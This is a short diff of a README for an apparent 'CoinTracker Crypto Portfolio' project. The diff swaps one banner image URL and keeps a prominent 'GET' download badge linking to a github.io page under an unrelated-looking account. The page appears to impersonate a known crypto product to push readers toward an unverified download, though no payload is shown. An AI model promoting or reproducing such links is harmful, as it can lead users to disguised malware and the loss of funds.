@@ -1,6 +1,6 @@
 # CoinTracker Crypto Portfolio — Digital Asset Management
 
-![Banner Placeholder](https://techcrunch.com/wp-content/uploads/2022/01/image-12.png)
+![Banner Placeholder](https://www.block-chain24.com/sites/default/files/styles/full_bg/public/img/0mcbexvxpk47ubtzr.png?itok=cdiOdVhl)
 
 [![GET — CoinTracker](https://img.shields.io/badge/GET%20%E2%80%94%20CoinTracker-0078D6?style=for-the-badge&logoColor=white)](https://grentoolhop853.github.io/.github/CoinTracker-Crypto-Portfolio)
 
